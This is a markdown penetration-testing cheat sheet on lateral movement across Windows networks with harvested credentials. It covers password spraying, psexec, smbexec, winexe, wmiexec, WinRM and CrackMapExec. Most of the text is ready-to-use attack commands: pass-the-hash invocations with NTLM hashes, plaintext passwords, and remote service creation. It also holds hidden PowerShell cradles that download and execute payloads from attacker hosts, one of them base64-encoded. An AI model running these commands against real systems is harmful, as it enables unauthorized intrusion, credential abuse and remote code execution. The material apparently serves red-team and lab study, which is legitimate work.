# Using Credentials

## Password Spraying
- `auxiliary/scanner/smb/smb_login`
- Send the same credentials to all hosts listening on 445
    - `msf auxiliary(smb_login) > services -p 445 -R`
- Can do same with `CrackMapExec` for a subnet: https://github.com/byt3bl33d3r/CrackMapExec
- Can use following command to explore:
```
net use \\machine-name /user:username@domainname passwords
dir \\machine-name\c$
net use
```
- Can be detected by using `net session`
- Can terminate all session with `net use /delete *`
- Some commands, such as `net view` use the login user-name. .: use `runas`
```
runas /netonly /user:user@domainname "cmd.exe"
net view \\machine-name /all
```
- Verify it uses Kerberos by `klist`

## Get shells

### psexec
- `auxiliary/admin/smb/psexec`
- `auxiliary/admin/smb/psexec_comman`
- psexec.py - https://github.com/CoreSecurity/impacket

```
/opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.10
```

```
PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software
```
```
\\machinename -u user@domainname -p password cmd.exe
```
- `-s` to get `SYSTEM` shell
- Use runas to use Kerberos TGT and avoid giving password:
```
runas /netonly /user:user@domainname PsExec.exe \\machinename -u user@domainname  cmd.exe
```

Manual Operation
- Copy a binary to the ADMIN$ share over SMB (`C:\Windows\PSEXECSVC.exe.`)
    - `copy example.exe \\machine\ADMIN$`
- Create a service on the remote matching pointing to the binary
    - `sc \\machine create serviceName binPath="c:\Windows\example.exe"`
- Remotely start the service
    - `sc \\machine start serviceName`
- When exited, stop the service and delete the binary
    - `del \\machine\ADMIN$\example.exe`

### smbexec.pp
- Stealthier (does not drop a binary)
- Creates a service
- Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe)
- Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it.
- Creates a log entry for each command.
-
```
Use Metasploit web_delivery to send script

sc \\machine create serviceName binPath="powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');"
sc \\machine start serviceName
```

### Winexe
- https://sourceforge.net/projects/winexe/

```
winexe -U Administrator //10.10.10.82 cmd.exe
```

#### Pass the hash
```
pth-winexe
-U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
//10.10.10.63 cmd
```

### wmiexec.py
- Windows Management Instrumentation (WMI) to launch a semi-interactive shell.
- WMI is the infrastructure for management data and operations on Windows (like SNMP).
- without touching disk or creating a new service.


```
wmiexec.py administrator:password@10.10.10.10
```
```
wmic computerystem list full /format:list  
wmic process list /format:list  
wmic ntdomain list /format:list  
wmic useraccount list /format:list  
wmic group list /format:list  
wmic sysaccount list /format:list  
```
- https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023
- https://windowstech.net/wmic-commands/
- Can query remotely.
- Logging for WMI events is disabled by default: https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx
```
wmic
wmic> /node:"machinename" /user:"username" computerystem list full /format:list
```
- Local admins on a remote machine
```
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
```
- Who is logged-in: `wmic /node:ordws01 path win32_loggedonuser get antecedent`
- Read nodes from text file: `wmic /node:@workstations.txt path win32_loggedonuser get antecedent  `
- Execute command:
```
powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw...truncated...  
```
```
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
```
- Used in:
    - https://github.com/samratashok/nishang
    - https://github.com/PowerShellMafia/PowerSploit
    - CrackMapExec
    - wmiexec.py
    - wmis

### pth-wmis

pth-wmis doesn’t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running.

```
echo "iex (New-Object Net.WebClient).DownloadString('http://172.16.67.128:80/6WcepYO')" | iconv --to-code UTF-16LE | base64 -w 0
kaliwmis-32 -U administrator%badpassword //10.10.10.10 "cmd.exe /c  powershell.exe -nop -enc <base64-value>"
```


### Windows Remote Management (WinRM)
- 5985/tcp (HTTP) / 5986/tcp (HTTPS)
- Allows remote management of Windows machines over HTTP(S) using SOAP.
- On the backend it's utilizing WMI.
- Enable: `Enable-PSRemoting -Force Set-Item wsman:\localhost\client\trustedhosts *`
- Test if target is configured for WinRM: `Test-WSMan machinename`
- Execute command: `Invoke-Command -Computer ordws01 -ScriptBlock {ipconfig /all} -credential CSCOU\jarrieta  `
    - Command line: `Enter-PSSession -Computer ordws01 -credential CSCOU\jarrieta `
- Force enabling WinRM:
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\ordws04 -u cscou\jarrieta -p nastyCutt3r -h -d powershell.exe "enable-psremoting -force"  
```

### CrackMapExec
- "-x" parameter to send commands.
- wmiexec.py across multiple IPs

### Using Remote Desktop
- Impacket's rdp_check to see if you have RDP access,
- Then use Kali's rdesktop to connect:


## References
> - https://blog.ropnop.com/using-credentials-to-own-windows-boxes/





## Invoke command with credentials

```
$user = '.\administrator';
$psw = '1234test';
$secpsw = ConvertTo-SecureString $psw -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $user, $secpsw
```

```
invoke-command -computername localhost -credential $credential
-scriptblock {cd C:\Users\Administrator\Desktop\;C:\Users\Administrator\Desktop\root.exe}
```